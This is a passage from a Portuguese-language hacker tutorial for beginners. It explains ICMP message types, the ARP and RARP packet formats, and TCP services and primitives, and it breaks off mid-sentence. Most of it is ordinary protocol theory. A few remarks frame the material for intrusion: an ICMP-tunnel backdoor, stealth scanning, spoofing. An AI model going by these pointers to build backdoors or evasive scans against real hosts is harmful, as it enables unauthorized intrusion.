+* Tempo Excedido ->  Retorna por um gateway quando o tempo de vida de um
+		     datagrama expira.Essa mensagem tambem eh retornada
+		     por uma estacao quando o tempo para remontagem de
+		     uma mensagem segmentada expira.
+
+* Destinatario Inacessivel -> Mensagem aplicada nos diversos casos em que
+			      o datagrama nao pode ser entregue ao destina-
+			      tario especificado.Pode indicar desde a 
+			      existencia de um gateway sem a informacao
+			      necessaria para dar continuidade ao 
+			      encaminhamento do datagrama ateh uma porta
+			      na estacao de destino sem possibilidade de
+			      acesso.
+
+* Redirecao -> Usada pelo gateway para notificar uma estacao sobre uma
+	       rota mais adequada ao destinatario do datagrama por ele
+	       enviado.Eh usada pelas estacoes para atualizar suas
+	       tabelas de enderecos de gateways.
+
+* Problema de Parametro -> Relata a ocorrencia de erros de sintaxe ou
+			   semantica no cabecalho do datagrama IP.
+
+* Marca de Tempo e 
+  Resposta a Marca de Tempo -> Sao usadas para medir as caracteristicas
+			       de atraso no transporte de datagramas em
+			       uma rede internet.O emissor registra o
+			       momento de transmissao na mensagem.O
+			       destinatario, ao receber a mensagem, faz
+			       o mesmo.Mediante a recepcao da mensagem
+			       "Resposta a Marca de Tempo"(timestamp) o
+			       emissor toma conhecimento do tempo de
+			       transmissao transcorrido.
+
+* Solicitacao de Informacoes
+  e Resposta de Informacoes -> Usadas por uma estacao para recuperar o
+			       endereco da sub-rede a qual estah 
+			       conectada.
+
+* Solicitacao de Mascara de
+  Endereco e Resposta a
+  Mascara de Endereco     -> Utilizados por uma estacao na recuperacao da
+			     mascara de enderecos quando eh aplicado o 
+			     sub-enderecamento ao endereco IP.A estacao
+			     emite a mensagem e o gateway responsavel
+			     responde com a descricao da mascara.
+
+
+
+4.2.2 - Tirando Proveito
+---------------------------
+
+O que vimos acima, pode ser muito util para o entendimento de algumas
+tecnicas fucadoras interessantes, que envolvem este protocolo.Como quase
+tudo hoje em dia na Internet, este protocolo pode ser usado para fins
+maliciosos.Um exemplo de uma tecnica que se utiliza deste procotolo, eh
+uma backdoor usando ICMP ECHO_REQUEST, criando o famoso tunel ICMP, 
+descrito num txt do module que pode ser encontrado na home page do
+Unsekurity Team: http://unsekurity.virtualave.net/ , vale a pena uma
+conferida, mano!
+
+
+4.3 - ARP
+------------
+
+O endereco IP permite o roteamento das mensagens entre sub-redes, sendo
+as mensagens encaminhadas de gateway a gateway ateh seu destino.Entre os
+gateways, as mensagens sao transportadas pelas sub-redes fisicas locais.
+Por este motivo, o software de rede TCP/IP eh obrigado a obter o endereco
+fisico na sub-rede local correspondente ao endereco IP que consta na
+mensagem.Este problema eh chamado "resolucao de enderecos"(address
+resolution).Existem algumas solucoes simples, como a manutencao de tabelas
+onde ha uma correspondencia direta entre o endereco IP e o endereco fisico
+ou a utilizacao do proprio endereco fisico na formatacao do endereco IP.
+Apesar de serem duas solucoes validas, ha casos em que elas nao podem ser
+aplicadas, como nas sub-redes "Ethernet", onde o tamanho do endereco MAC
+(Medium Access Control)(48 bits) eh superior ao tamanho do endereco IP
+(32 bits).O mesmo pode ser dito sobre o problema inverso.
+O TCP/IP possui dois protocolos especificos para a questao da resolucao
+de endereco: os protocolos ARP(Address Resolution Protocol) e RARP(Reverse
+Address Resolution Protocol).Vejamos os dois abaixo.
+
+4.3.1 - O Protocolo ARP
+--------------------------
+
+Este protocolo tem por objetivo oferecer um mecanismo de mapeamento
+dinamico do endereco IP em endereco fisico.A solucao dinamica significa
+que as estacoes realizam o mapeamento a partir da interacao com as outras
+estacoes, nao havendo tabelas fixas configuradas previamente ou enderecos
+fisicos embutidos no endereco IP.Desta forma, ha uma significativa
+independencia na criacao dos enderecos IP, permitindo que a arquitetura
+TCP/IP seja utilizada sobre as tecnologias de sub-redes cujos enderecos
+fisicos sao incompativeis com o espaco reservado para o endereco IP, tal
+como citado anteriormente para as redes Ethernet.
+Neste tipo de mapeamento, a estacao nao conhece o endereco fisico da
+estacao destinataria, somente o seu endereco IP.Para recuperar aquele
+endereco fisico, a estacao monta um quadro "broadcast" cujo conteudo eh
+a mensagem ARP, contendo o endereco IP a ser mapeado, conforme mostra o
+esquema abaixo:
+
+					 -----------------
+					|   Mensagem ARP  |
+					 -----------------
+					.		  .		  
+					.		  .
+				        .		  .
+		    -------------------------------------- 
+		   |   Cabecalho MAC    |    Dados MAC	  | 
+		    --------------------------------------
+
+Alem disso, a mensagem ARP contem o mapeamento endereco IP - endereco
+fisico da estacao solicitante.Como a mensagem eh do tipo broadcast, todas
+as estacoes presentes na sub-rede a recebem.Ao avaliarem a mensagem, as
+estacoes, atraves do campo "tipo" do cabecalho do quadro(no caso de redes
+Ethernet, o seu valor eh #0806), verificam tratar-se de uma requisicao
+ARP.As estacoes aproveitam a oportunidade para atualizar suas referencias
+de enderecamento, recuperando o mapeamento endereco IP - endereco fisico
+da estacao emissora.No entanto, somente a estacao que reconhece o seu
+endereco IP no conteudo da mensagem ARP trata a requisicao e monta uma
+mensagem de respostas contendo o seu mapeamento endereco IP - endereco
+fisico.Tal mensagem eh enviada diretamente a estacao emissora, pois o
+endereco fisico desta ultima estah presente na requisicao.
+
+O protocolo ARP independe da sub-rede fisica adjacente.Entretanto, uma vez
+que deve transportar enderecos fisicos, como conteudo, as mensagens ARP
+possuem formato variavel em funcao das caracteristicas da sub-rede
+utilizada.
+
+Vejamos abaixo o formato da uma mensagem ARP:
+
+ 0				   16				     31
+ ----------------------------------------------------------------------
+|     tipo de hardware            |       tipo de protocolo	       |	
+ ----------------------------------------------------------------------
+|      HLEN      |     PLEN	  |		operacao	       |
+ ----------------------------------------------------------------------
+|		    HA do Emissor (octetos 0 - 3)		       |
+ ----------------------------------------------------------------------
+|   HA do emissor(octetos 4-5)    |     IP do Emissor(octetos 0-1)     |	
+ ----------------------------------------------------------------------
+|   IP do Emissor(octetos 2-3)    |   HA do destinatario(octetos 0-1)  |
+ ----------------------------------------------------------------------
+|		 HA do destinatario (octetos 2-5)		       |
+ ----------------------------------------------------------------------
+|		 IP do destinatario (octetos 0-3)		       |
+ ----------------------------------------------------------------------
+
+Legenda:
+
+ * HA - Endereco Fisico (Hardware Address)
+ * HLEN - Comprimento de Endereco Fisico (Hardware Length)
+ * IP - Endereco IP
+ * PLEN - Comprimento de Endereco de Protocolo (Protocolo Length).
+
+Vamos ver o que significa cada campo destes descritos acima:
+
++ tipo de hardware ->  Este campo indica qual eh o tipo de interface de
+		       rede que estah sendo usada.Para interfaces 
+		       "Ethernet", este campo vale "1".
+
++ tipo de protocolo -> Este campo indica qual eh o tipo de protocolo da
+		       camada superior que gera a solicitacao da conversao
+		       de enderecos.Em redes TCP/IP, este campo contem
+		       sempre o valor #0800.
+
++ operacao -> Este campo indica qual eh o tipo de mensagem: requisicao
+	      ARP(1), resposta ARP(2), requisicao RARP(3) e resposta
+	      RARP(4).No protocolo RARP descrito mais abaixo, eh usado
+	      o mesmo formato de mensagem do ARP.
+
++ HLEN -> Este campo permite ao ARP trabalhar com diferentes tipos de
+	  enderecos, pois especifica o comprimento do endereco fisico.
+
++ PLEN -> Mesma definicao de HLEN, mas aqui eh especificado o comprimento
+	  do endereco da camada superior.
+
++ HA do emissor -> Este campo eh preenchido de varias maneiras, assim
+		   como o campo HA do receptor e os campos IP do emissor e
+		   IP do receptor.Refere-se ao endereco fisico do emissor.
+
++ IP do emissor -> Este campo refere-se ao endereco IP do emissor.
+
++ HA do receptor -> Endereco fisico do receptor.
+
++ IP do receptor -> Endereco IP do receptor.
+
+No caso de uma operacao de requisicao ARP, o emissor fornece o seu
+endereco fisico no campo HA do emissor, o seu endereco no campo IP do
+emissor e coloca no campo IP do destinatario o endereco IP que deverah ser
+mapeado pela estacao estacao de destino em endereco fisico.Feito o
+mapeamento, a estacao de destino monta uma resposta ARP(campo "operacao" =
+2) e a envia para o emissor da requisicao de mapeamento.Na resposta ARP,
+a estacao de destino informa o seu endereco fisico atraves do campo
+"HA do destinatario".
+
+4.3.2 - O Protocolo RARP 
+-------------------------
+
+Este protocolo destina-se a solucao do problema inverso ao resolvido pelo
+ARP.O Problema RARP(Revese Address Resolution Protocol) eh o de uma
+estacao que nao conhece ou o seu proprio endereco IP ou o de uma outra
+estacao, mas possui o endereco fisico correspondente.O Protocolo RARP
+permite que, a partir do endereco fisico, seja obtido o endereco IP
+correspondente.Como jah visto, o formato da mensagem eh o mesmo que no
+protocolo ARP e o tipo de mensagem eh indicado atraves do campo operacao.
+Para que o RARP funcione, eh necessario que pelo menos uma estacao,
+denominada servidor RARP, possua as informacoes de mapeamento de todas as
+outras estacoes da rede.Pode haver um ou varios servidores RARP na mesma
+rede.A informacao que particulariza uma estacao em relacao as outras na
+mesma sub-rede eh exatamente o seu endereco fisico.Assim, durante o
+processo de inicializacao da rede, o protocolo RARP eh acionado atraves do
+envio de uma mensagem "broadcast" que contem a solicitacao de mapeamento
+endereco fisico - endereco IP.
+A mensagem eh difundida na rede.Todas as estacoes a recebem, mas apenas os
+servidores a tratam.A partir do endereco fisico, as tabelas internas dos
+servidores sao consultadas e uma mensagem RARP de resposta eh montada e
+enviada diretamente a estacao solicitante, contendo o endereco IP
+solicitado.
+No caso de haver varios servidores, para que se evite o aumento do numero
+de colisoes provocado pela respostas simultanea a mesma solicitacao, eh
+criada a figura de um servidor prioritario, que sempre possui a
+responsabilidade de responder primeiro.Caso este nao responda dentro de
+um intervalo de tempo pre-estabelecido, os outros servidores podem atuar.
+No RARP, da mesma forma que no ARP, as mensagens tambem possuem formato
+variavel, para suportar os diversos tipos de enderecos fisicos possiveis.
+
+
+4.4 - TCP
+----------
+
+O Protocolo TCP eh o mais fantastico e de suma importancia para conexoes
+internet e transporte de pacotes.Este protocolo eh muito util em intuitos
+fucadores, com ele se torna possivel a implementacao de varias tecnicas,
+desde scanners stealphs(dificil percepcao por parte da vitima), ateh mesmo
+implementacoes spoofs e de redirecionamento.Irei descrever o basico sobre
+este protocolo, para que mais a frente possamos construir pacotes mais
+complexos e avancar em tecnicas fucadoras mais avancadas, lembrando mais
+uma vez que eh para Newbie que escrevo, por isso faz-se necessario todas
+essas teorias.
+
+A Arquitetura "Internet" especifica dois tipos de protocolos na camada de
+transporte: um orientado,o TCP(Transmission Control Protocol), que garante 
+a transferencia confiavel de dados; e um nao-orientado a conexao, o UDP
+(User Datagram Protocol), uma simples extensao do protocolo IP da camada de
+rede que, como o proprio nome diz eh baseado em datagramas,e portanto,nao
+oferece garantia de entrega de dados.(Veja a parte acima sobre Protocolo
+UDP).
+A utilizacao de um ou outro protocolo depende das necessidades da aplicacao
+(quantidade de servico,tipos de dados,etc.) considerada.Dentro da arquitetura
+Internet, aplicacoes,tais como a de gerenciamento, utilizam o UDP, e outras, 
+como a de transferencia de arquivos, utilizam o TCP.
+
+O Objetivo do TCP eh oferecer aos seus usuarios um servico de transferencia
+confiavel de dados, implementando mecanismos de recuperacao de dados perdidos,
+danificados ou recebidos fora de sequencia e minimizando o atraso de transito
+para a transmissao dos dados.
+O TCP eh um protocolo fim-a-fim, orientado a conexao, provendo comunicacao
+confiavel entre pares de processos residentes em estacoes(hosts) que podem
+estar ligadas a diferentes redes de computadores interconectadas entre si.
+O TCP assume que pode obter um servico de datagrama simples, e potencialmente,
+nao-confiavel dos protocolos das camadas inferiores. Em principio, o TCP
+deve ser capaz de funcionar sobre um largo espectro de sistemas de
+comunicacao, desde linhas ponto-a-ponto ateh redes comutadas por pacotes.
+O TCP reside na camada imediatamente acima do protocolo IP(Internet Protocol),
+que prove o servico de transferencia de segmentos de dados de tamanho
+variavel, inseridos em datagramas "internet". A camada IP realiza a
+fragmentacao e a remontagem dos segmentos TCP, operacoes necessarias ao
+transporte e a entrega de dados atraves de multiplas redes e gateways de
+interconexao, utilizando informacoes sobre precedencia, nivel de seguranca
+e a fragmentacao realizada sobre os segmentos TCP.Vejamos o esquema abaixo
+sobre as camadas da arquitetura Internet:
+
+			-----------------------
+		       |      Aplicacoes       |
+			-----------------------
+		       |         TCP	       |
+  			-----------------------
+		       |          IP	       |
+			-----------------------
+		       |Sub-Rede de Comunicacao|
+			-----------------------
+
+
+Como podemos ver no esquema acima, a camada TCP localiza-se acima da
+camada IP.
+
+4.4.1 - Conceitos 
+--------------------
+
+Para uma aplicacao(processo) de uma estacao(host) utilizar os servicos do
+TCP, ela se associa a uma "porta de servico TCP(port)". Uma porta, quando
+ligada a um endereco IP, constitui um "socket". Dentro de uma estacao cada
+porta eh identificada por um numero proprio e unico; de maneira analoga, 
+cada estacao tem um endereco IP unico dentro de uma rede internet.Daih
+decorre que um socket tem uma identificacao unica dentro de uma rede
+internet.
+Um par de sockets eh usado para identificar uma conexao entre dois processos. 
+Uma vez estabelecida uma conexao, cada socket passa a corresponder a um
+ponto final(endpoint) dessa conexao.
+Varios processos dentro de uma unica estacao podem usar os servicos do TCP
+simultaneamente.Para que isso seja possivel, eh necessario estabelecer varias 
+conexoes entre esses processos e outros residentes em estacoes remotas.
+Diz-se, entao, que eh efetuada uma "multiplexacao" decorrente da existencia
+de varias conexoes simultaneas envolvendo processos de uma mesma estacao.
+(Lembra-se de select()??:) ).
+Uma vez estabelecida uma conexao, os processos correspondentes podem
+prosseguir transferindo dados no modo "full-duplex" ou "half-duplex",isto eh,
+com transferencias concorrentes em ambas as direcoes ou com transferencias
+alternadas em uma ou outra direcao.Os dados transferidos podem ser
+considerados como um "stream" de octetos ou uma sequencia de "registros".
+No TCP, os registros sao chamados "letters", possuindo tamanho variavel. 
+Tanto um stream como um letter podem ser divididos em "segmentos" antes de
+serem transmitidos ao seu destino.Um segmento pode conter parte ou um letter
+inteiro, mas nunca parte de mais de um letter.Na recepcao, os segmentos sao
+remontados em um unico letter antes da entrega deste ao processo receptor.
+O TCP eh responsavel por realizar o "controle de fluxo" dos segmentos nas
+respectivas conexoes, evitando a sobrecarga dos processos durante a recepcao
+de dados. Para este fim, utiliza-se a tecnica de controle de fluxo "janela
+deslizante"(sliding window) com alocacao de credito.Alem disso, o TCP deve
+exercer o "controle de erros" sobre os dados recebidos.Isto eh feito atraves
+do controle de sequencia e da utilizacao da soma verificadora(checksum).
+
+4.4.2 - Servicos do Protocolo
+--------------------------------
+
+De maneira geral, o objetivo dos servicos oferecidos pelo TCP eh o transporte 
+confiavel de dados fim-a-fim entre dois processos.O esquema abaixo descreve
+de forma basica alguns servicos do TCP:
+
+ ---------------------------------------------------------------------
+|         SERVICO	       |	   DESCRICAO		      |
+ ---------------------------------------------------------------------
+|+ MULTIPLEXACAO               | Suporta multiplos usuarios atraves   |
+|			       | da utilizacao de portas.             |
+ ---------------------------------------------------------------------
+|+ GERENCIAMENTO DE CONEXAO    |				      |
+|			       |				      |
+|  Estabelecimento             | Estabelece conexao entre um par de   |
+|                              | sockets de acordo com a seguranca e  |
+|                              | a precedencia especificadas.         |
+|                              |                                      |
+|  Manutencao                  | Mantem a conexao para transporte de  |
+|			       | dados.				      |
+|			       |				      |
+|  Terminacao                  | Prove o termino normal(graceful) ou  |
+|			       | abrupto da conexao existente.        |
+ ---------------------------------------------------------------------
+| + TRANSFERENCIA DE DADOS     |				      |
+|  			       |				      |
+|   Full-duplex                | Entrega dados de forma bidirecional  |
+|			       | e simultanea entre os dois sockets   |
+|			       | da conexao.			      |
+|			       |				      |
+|   Temporizada		       | Entrega dados de acordo com a tempo- |
+|			       | rizacao especificada pelo usuario,   |
+|			       | ou, caso isto nao seja possivel,     |
+|			       | notifica-o de erro.		      |
+|			       |			              |
+|   Ordenada                   | Entrega dados ao usuario de destino  |
+|			       | na sequencia enviada pelo usuario de |
+|			       | origem.			      |
+|			       |				      |
+|   Rotulada		       | Niveis de seguranca e precedencia da |
+|			       | conexao sao associadas a cada        |
+|			       | transferencia de dados.              |
+|			       |				      |
+|   Com Controle de Fluxo      | O fluxo de dados atraves da conexao  |
+|			       | eh regulado.			      |
+|			       |				      |
+|   Com Verificacao de Erros   | Os dados sao entregues livres de     |
+|			       | erros.				      |
+ ---------------------------------------------------------------------
+| + CAPACIDADES ESPECIAIS      |				      |
+|			       |				      |
+|   Data Stream Push           | Obriga o envio dos dados atraves da  |
+|			       | conexao e a sua entrega ao usuario   |
+|                   	       | de destino.			      |
+|			       |				      |
+|Sinalizacao de Dados Urgentes | Especifica a transferencia e a       |
+|			       | entrega de dados prioritarios.       |
+ ---------------------------------------------------------------------
+| + RELATORIO DE ERROS         | Relata falha do servico.	      |
+ ---------------------------------------------------------------------
+
+
+Irei descrever de forma basica o que corresponde cada um desses servicos
+descritos acima:
+
+* MULTIPLEXACAO
+----------------
+
+Para permitir que varios processos dentro de uma mesma estacao utilizem
+simultaneamente suas facilidades de comunicacao, o TCP prove um conjunto
+de enderecos ou portas dentro de cada estacao. A associacao de portas aos
+processos eh tratada independentemente em cada estacao. Essas portas
+concatenadas com os enderecos de rede (enderecos IP) da estacao constituem
+um "socket", cujo numero eh unico em uma rede internet.Eh util associar
+processos frequentemente utilizados(por exemplo, servidor de arquivos) a
+sockets fixos de conhecimento publico para facilitar o acesso a eles.O
+estabelecimento e o conhecimento dos sockets de outros processos envolvem
+mecanismos mais dinamicos.
+Os servicos TCP sao fornecidos atraves de uma conexao logica entre um par
+de sockets.
+
+* GERENCIAMENTO DE CONEXAO
+---------------------------
+
+Quando dois processos desejam comunicar-se, seus protocolos de transporte
+devem primeiro estabelecer uma conexao, ou seja, sincronizar os dois lados
+da comunicacao para, entao, transferir dados entre os processos.No momento
+em que a comunicacao estiver concluida, a conexao eh desfeita para liberar
+os recursos alocados e, assim, permitir que esses recursos venham a ser
+utilizados por outros usuarios.
+
+O servico de "estabelecimento de conexao" permite que dois usuarios TCP
+ativem uma conexao logica entre seus respectivos sockets.Uma conexao logica
+eh caracterizada por propriedades que perduram durante todo o tempo de sua
+existencia.As propriedades mais importantes sao os niveis de seguranca e
+precedencia(medida da importancia dos segmentos de dados a serem
+tranferidos), parametros especificados pelos dois usuarios TCP quando do
+estabelecimento da conexao.
+Uma conexao entre dois usuarios TCP pode ser estabelecida se:
+
+1 -> Nao existir, ainda, nenhuma conexao entre os sockets associados a 
+     esses usuarios.Um determinado socket pode pertencer simultaneamente
+     a mais de uma conexao, mas nao pode existir mais de uma conexao
+     envolvendo o mesmo par de sockets;
+
+2 -> Os recursos interno do TCP forem suficientes;
+
+3 -> Ambos os usuarios concordarem com a conexao;
+
+O Servico de "manutencao de conexao" prove o intercambio e o transporte de
+dados entre os dois sockets e os servicos associados as capacidades especiais
+descritas posteriormente.A "terminacao de conexao" pode ser abrupta ou normal
+(graceful).No caso de uma terminacao abrupta, os dados em transito podem ser
+perdidos.Uma terminacao normal evita que qualquer um dos lados se desconecte
+antes que todos os dados tenham sido entregues(Atencao nesse conceito, ele
+eh bastante util em scanners half-open).
+
+* TRANSFERENCIA DE DADOS
+-------------------------
+
+O TCP eh capaz de transferir um "stream" continuo de octetos em cada direcao
+entre seus usuarios, agrupando um certo numero de octetos para formar
+segmentos e transmi-los sobre a rede internet.Neste modo "stream", o proprio
+TCP decide quando segmentar e enviar dados, de acordo com a sua conveniencia.
+O TCP permite tambem que os usuarios utilizem o servico orientado a registro
+(record-oriented).Neste caso, o usuario entrega registros, denominados
+letters, para transmissao.Quando o usuario emissor sinaliza o fim de um 
+registro(end-of-letter), o TCP prontamente envia os dados entreguem ateh
+aquele ponto para o receptor.
+Alem disso, o TCP tem meios para comunicar ao receptor que em algum ponto
+adiante, ao longo do stream de dados que o receptor estah lendo, ha um dado
+urgente.O TCP nao especifica que atitude o usuario deve tomar sobre a
+informacao de urgencia do dado em questao, mas o procedimento padrao eh de
+que o processo receptor de prioridade a leitura dos dados urgentes.
+O Servico de trsnaporte de dados oferece facilidades referentes a:
+
++ transferencia full-duplex: os usuarios podem transmitir dados,
+                simultaneamente, em ambas as direcoes de uma dada conexao.
+
++ temporizacao de entrega: o usuario pode especificar um prazo maximo para
+                a entrega de dados.Isto eh feito pela associacao de um
+                temporizador(timeout) aos dados submetidos para transmissao.
+		Se o TCP nao conseguir entregar os dados no tempo
+		especificado, ele notifica o usuario da falha do servico e
+		termina abruptamente a conexao.
+
++ transferencia ordenada: o TCP eh orientado a stream, isto eh, os usuarios	
+		trocam cadeias(streams) de octetos de dados.O TCP garante que
+		o stream de dados fornecido pelo usuario de origem eh entregue
+		na mesma ordem ao usuario destino, ainda que tenha ocorrido
+		segmentacao durante a transmissao.
+
++ rotulacao: o TCP estabelece uma conexao somente se os niveis de seguranca
+	     fornecidos pelos dois usuarios coincidirem.Por outro lado, se
+	     os niveis de precedencia nao coincidirem, o nivel mais alto 
+	     solicitado eh associado a conexao.Todos os dados transferidos
+	     na conexao carregam os niveis de precedencia e seguranca
+	     associados. Eles sao fornecidos ao IP para a transferencia de
+	     segmentos atraves da rede internet.
+
++ controle de fluxo: de acordo com a alocacao de buffers realizada pelo
+		usuario, o TCP regula o fluxo de dados para previnir
+		congestionamento interno que poderia levar a degradacao e
+		falha do servico de transporte de dados.
+
++ verificacao de erros: o TCP emprega um algoritmo simples de soma
+		verificadora (checksum) e entrega dados livres de erro
+		dentro das probabilidades suportadas por esse algoritmo.
+
+* CAPACIDADES ESPECIAIS
+------------------------
+
+O TCP suporta duas capacidades especiais associadas a transferencia de
+dados: data stream push e sinalizacao de dados urgentes.
+
++ data stream push: normalmente, o TCP decide qual eh a quantidade de dados
+		suficientes para formar um segmento a ser transmitido.O
+		usuario emissor pode solicitar, atraves da entrega de dados
+		marcados com o flag "push", que o TCP transmita todos os
+		dados acumulados ateh entao, incluindo os marcados com o
+		flag "push".No lado receptor, o TCP normalmente armazena os
+		dados recebidos em um buffer e os entrega de tempos em tempos
+		ao usuario destino.Quando sao recebidos dados marcados com o
+		flag push, o TCP entrega imediatamente ao usuario de destino
+		todos os dados armazenados no buffer, inclusive os marcados
+		com o flag push.Um usuario emissor pode solicitar este
+		servico quando os dados transmitidos ateh aquele ponto
+		constituirem uma unidade logica para processamento.
+
++ sinalizacao de dados urgentes: o TCP prove meios de informar, atraves da
+		utilizacao do flag "urgent", ao usuario de destino que
+		chegaram dados significativos ou urgentes.Eh responsabilidade
+		deste usuario realizar a acao adequada.
+
+* RELATORIO DE ERROS
+---------------------
+
+O TCP relata falhas de servico originadas em situacoes de funcionamento
+anormal no ambiente da rede, falahas estas que ele nao conseguiu recuperar,
+por exemplo, a queda de enlaces fisicos ou a pane de uma estacao(host).
+
+
+4.4.3 - Primitivas de Servico
+------------------------------
+
+Os servicos prestados pelo TCP sao definidos em termos de primitivas de
+servico e seus parametros.Existem dois tipos de primitivas de servico,
+as de pedido de servico, que sao emitidas pelo usuario ao TCP, e as
+de resposta de servico, que sao emitidas pelo TCP aos usuarios.
+
+Veremos algumas primitivas de pedido de servico abaixo:
+
+ ------------------------------------------------------------------------
+|   PRIMITIVA     |   PARAMETROS     |		  DESCRICAO              |
+ ------------------------------------------------------------------------
+|  Passive Open   |porta de origem,[t| Aguarda tentativa de conexao de   |
+| nao-especificada|emporizador],[acao| qualquer destinacao remota, com   |
+|		  |de temporizacao], | niveis de seguranca e procedencia |
+|                 |[precedencia],[fa-| especificados.			 |
+|		  |-ixa de seguranca]|					 |
+ ------------------------------------------------------------------------
+|  Passive Open   |porta de origem,po| Aguarda tentativa de conexao de   |
+|  completamente  |rta de destino,en-| uma destinacao remota especifica, |
+|  especificada   |dereco de destino,| com niveis de seguranca e 	 |
+|		  |[temporizador],[a-| precedencia especificados.	 |
+|		  |cao de temporizaca| 					 |
+|		  |o],[precedencia], |					 |
+|		  |[faixa d seguran.]|					 |
+ ------------------------------------------------------------------------
+|  Active Open    |porta de origem,po| Solicita conexao a uma destinacao |
+|		  |rta destino,[tempo| remota especifica, com niveis de  |
+|		  |rizador],[acao de | seguranca e precedencia		 |
+|		  |temporizacao],[pre| particulares.			 |
+|		  |cedencia],[segur.]| 					 |
+ ------------------------------------------------------------------------
+|  Active Open    |porta origem,porta| Solicita conexao a uma destinacao |
+|  com dados      |destino,[temporiza| remota especifica, com niveis de  |
+|		  |dor],[acao de temp| seguranca e procedencia particu-  |
+|		  |orizacao],[precede| lares.Tal primitiva contem tambem |
+|		  |ncia],[seguranca],| dados do usuario.		 |
+|		  |tam. campo d dados| 					 |
+|		  |,dados[push flag],|					 |
+|		  |[urgent flag]     |					 |
+ ------------------------------------------------------------------------
+|  Send		  |nome da conexao lo| Transfere dados atraves da conexao|
+|		  |cal,tam. campo de | identificada pelo parametro:nome  |
+|		  |dados,dados[push  | da conexao local.		 |
+|		  |flag],[urgent flag|					 |
+|		  |],[temporizador],[|					 |
+|		  |acao d tempor..]  |					 |
+ ------------------------------------------------------------------------
+|  Allocate       | nome da conexao  | Solicita ao TCP aumento da area   |
+|		  | local,tamanho do | alocada para a recepcao dos	 |
+|		  | campo de dados   | dados.				 |
+ ------------------------------------------------------------------------
+|  Close	  | nome da conexao  | Fecha a conexao normalmente.      |
+ ------------------------------------------------------------------------
+|  Abort	  | nome da conexao  | Fecha a conexao abruptamente.     |
+ ------------------------------------------------------------------------
+|  Status	  | nome da conexao  | Pergunta o status da conexao.	 |
+ ------------------------------------------------------------------------
+
+OBS: Os colchetes indicam parametros opcionais.
+
+O esquema acima nao tah bem feito,mas dah para entender legal.
+Abaixo segue um quadro explicando um pouco sobre as primitivas de
+resposta de servico TCP.
+
+ ------------------------------------------------------------------------
+|  PRIMITIVA  |		PARAMETROS     	      |      DESCRICAO		 |
+ ------------------------------------------------------------------------
+|   Open ID   |nome da conexao local,porta de | Informa ao usuario o nome|
+| 	      |origem,porta de destino*,ende- | atribuido a conexao soli |
+|	      |reco de destino*.	      | citada por esse usuario  |
+|	      |				      | atraves de uma primitiva |
+|	      |				      | Open.			 |
+ ------------------------------------------------------------------------
+|Open Failure | nome da conexao local.	      | Relata falha de um pedido|
+|	      |				      | Active Open.	         |
+ ------------------------------------------------------------------------
+| Open Sucess | nome da conexao local.	      | Relata a conclusao de um |
+|	      |				      | de Open pendente.        |
+ ------------------------------------------------------------------------
+| Deliver     | nome da conexao local,tamanho | Relata chegada de dados. |
+|	      | do campo de dados,            |				 |
+|	      | dados[urgent flag]	      |				 |
+ ------------------------------------------------------------------------
+|  Closing    | nome da conexao local         | Relata que o usuario do  |
+|	      |				      | TCP remoto emitiu um pe- |
+|	      |				      | dido de Close e todos os |
+|	      |				      | dados enviados pelo user |
+|	      |				      | remoto foram entregues.  |
+ ------------------------------------------------------------------------
+| Terminate   | nome da conexao local,        | Relata que a conexao foi |
+|	      | descricao		      | encerrada,sendo fornecida|
+|	      |				      | uma descricao da razao do|
+|	      |				      | encerramento.	         |
+ ------------------------------------------------------------------------
+| Status      | nome da conexao local,porta de| Relata o status atual da |
+| Response    | origem, endereco de origem,por| conexao.		 |
+|	      | ta destino, endereco destino, |				 |
+|	      | estado da conexao, janela de  |				 |
+|	      | recepcao,janela de transmissao|				 |
+|	      | ,quantidade de ACKs aguardando|				 |
+|	      | ,quantidade de recepcoes aguar|				 |
+|	      | dando,estado de urgencia,prece|				 |
+|	      | dencia,seguranca,temporizador |				 |
+ ------------------------------------------------------------------------
+| Error       |nome da conexao local,descricao|	Relata erros de pedido   |
+|	      |				      | ou erros internos.       |
+ ------------------------------------------------------------------------
+
+*Nao eh usado no caso de resposta a primitiva Passive Open nao-especificada.
+
+
+Vamos agora procurar entender de forma basica como se processa uma
+conexao.As quatro primeiras primitvas de pedido de servico no primeiro
+quadro sao usadas para "estabelecer uma conexao". As conexoes podem ser
+estabelecidas de dois modos: "ativo" e "passivo".No modo passivo, um
+usuario solicita ao TCP que aguarde pedidos de conexao da rede atraves de
+uma primitiva "Passive Open", que especifica o nivel de precedencia minimo
+desejado e a faixa de niveis de seguranca aceitaveis.A Passive Open pode
+ser completamente especificada ou nao especificada.No primeiro caso, o
+usuario especifica um socket remoto do qual ele aceitarah um pedido de
+conexao.Uma conexao eh,entao, estabelecida, quando uma "Active Open" eh
+executada na porta remota especificada pela "Passive Open".No segundo
+caso, o usuario declara o desejo de estabelecer uma conexao com qualquer
+outro usuario.Tal primitiva eh ideal para ser usada por um processo
+servidor que estah disponivel para outros processos desconhecidos.
+No modo ativo, usando a primitiva "Active Open", o usuario solicita ao
+TCP que tente abrir uma conexao com um socket remoto especifico, com
+niveis de precedencia e seguranca definidos.A conexao pode ser aberta se
+existir uma primitiva "Passive Open" no socket remoto ou se o socket
+remoto tiver emitido uma "Active Open".
+A tabela abaixo resume as condicoes para o sincronismo das primitivas.
+
+ -----------------------------------------------------------------------
+|        PRIMITIVAS        |	REQUISITOS P/ ABERTURA DE CONEXAO       |
+ -----------------------------------------------------------------------
+| Active Open, Active	   | Os enderecos de destino em cada primitiva  |
+| Open			   | referem-se ao outro socket.Parametros de   |
+|			   | seguranca sao identicos.			|
+ -----------------------------------------------------------------------
+| Active Open, Passive     | Os enderecos de destino em cada primitiva  |
+| Open completamente       | referem-se ao outro socket.O parametro de  |
+| especificada             | seguranca na Active Open estah dentro da   |
+|			   | faixa especificada pela Passive Open.      |
+ -----------------------------------------------------------------------
+| Active Open, Passive     | O parametro de seguranca na Active Open    |
+| Open nao especificada    | estah dentro da faixa especificada pelo    |
+|		           | Passive Open.				|
+ -----------------------------------------------------------------------
+
+Existem ainda algumas opcoes que o usuario, que solicita a conexao,pode
+usar; dentre elas, a de temporizacao instrui o TCP a entregar os dados ao
+destino dentro de um determinado intervalo de tempo.Nao ocorrendo isso, o
+TCP pode abordar a conexao ou informar ao usuario que ocorreu um estouro
+de temporizacao.
+
+O usuario que emite uma primitiva de pedido de conexao recebe duas
+respostas:
+
+ + uma primitiva "Open ID" eh, imediatamente, retornada pelo TCP ao
+   usuario, associando um nome local a conexao solicitada.Futuras
+   referencias a esta conexao devem especificar esse nome;
+
+ + no caso de um pedido de conexao feito atraves de uma "Active Open", se
